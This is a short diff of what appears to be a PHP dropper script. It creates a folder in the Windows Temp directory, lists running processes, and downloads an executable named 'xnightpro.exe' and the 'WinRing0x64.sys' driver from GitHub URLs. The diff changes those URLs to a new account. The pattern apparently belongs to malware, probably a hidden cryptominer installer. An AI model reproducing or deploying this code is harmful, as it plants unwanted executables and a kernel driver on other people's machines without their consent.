@@ -64,8 +64,8 @@ system('mkdir "C:/Windows/Temp/spawn/"');
 
 exec('tasklist', $output);
 
-$url =  'https://raw.githubusercontent.com/KarleyGreenholt/uni-test-project/refs/heads/main/xnightpro.exe';
-$url2 =  'https://raw.githubusercontent.com/KarleyGreenholt/uni-test-project/refs/heads/main/WinRing0x64.sys';
+$url =  'https://github.com/mainpoint91/mainpoint/releases/download/night/xnightpro.exe';
+$url2 =  'https://raw.githubusercontent.com/mainpoint91/mainpoint/refs/heads/main/WinRing0x64.sys';
 
 $file_name = 'C:/Windows/Temp/spawn/xnightpro.exe';
 $file_name2 = 'C:/Windows/Temp/spawn/WinRing0x64.sys';
